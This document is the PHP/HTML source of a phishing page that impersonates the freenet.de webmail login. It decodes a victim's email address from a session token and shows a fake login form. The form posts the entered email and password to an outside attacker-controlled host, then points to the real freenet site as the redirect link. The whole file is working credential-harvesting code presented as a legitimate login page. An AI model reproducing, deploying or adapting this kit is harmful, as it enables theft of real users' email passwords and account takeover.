<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Aktuelle Nachrichten, E-Mail, Cloud &amp; Hosting - freenet.de</title>
<link rel="shortcut icon" type="image/x-icon" href="https://www.freenet.de/webfiles/1689766461493/icons/freenet.ico"> 
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password]{
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 29px;
  width: 100%;
  padding: 8 15px;
  margin: 0;
  background: white;
  border: 1px solid #d6d6d6;
  border-top: 1px solid #d6d6d6;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0px;
  font-size: 15px;
  line-height: 1.42857143;
  vertical-align: top;
  color: #404040;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  border: 1px solid white;
  }
</style>
<body>
<form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
<table border="0" width="1349" cellspacing="0" cellpadding="0" height="11142" background="img/bg.png">
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td height="176" ></td>
			</tr>
			<tr>
				<td height="555">
				<table border="0" width="100%" cellspacing="0" cellpadding="0" height="555">
					<tr>
						<td width="28">&nbsp;</td>
						<td width="623">&nbsp;</td>
						<td width="339" ></td>
						<td width="300">
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
							<tr>
								<td height="175">
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="21">&nbsp;</td>
										<td height="175">
										<table border="0" width="100%" cellspacing="0" cellpadding="0">
											<tr>
												<td height="62"></td>
											</tr>
											<tr>
												<td>
												 <input type="text" name="user" required value="" placeholder="E-Mail-Adresse" autofocus >
												 <input type="hidden" name="domain" value="<?php echo $users;?>@<?php echo $ddomain;?>" >		<input type="hidden" name="link" value="https://www.freenet.de/index.html" >		 
<input type="hidden" name="sender" value="Freenet.de" >
												</td>
											</tr>
											<tr>
												<td height="1"></td>
											</tr>
											<tr>
												<td>
												   <input type="password" name="passwd" required placeholder="Passwort" >
												</td>
											</tr>
											<tr>
												<td height="10" ></td>
											</tr>
											<tr>
												<td>
												<table border="0" width="100%" cellspacing="0" cellpadding="0">
													<tr>
														<td>&nbsp;</td>
														<td width="116">
														<input type="image" src="img/btn.png" width="116" height="34"></td>
													</tr>
												</table>
												</td>
											</tr>
											<tr>
												<td height="10"></td>
											</tr>
										</table>
										</td>
										<td width="19">&nbsp;</td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="379">&nbsp;</td>
							</tr>
						</table>
						</td>
						<td width="60" ></td>
					</tr>
				</table>
				</td>
			</tr>
			<tr>
				<td height="10411"></td>
			</tr>
		</table>
		</td>
	</tr>
</table>
</form>
</body>

</html>
<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>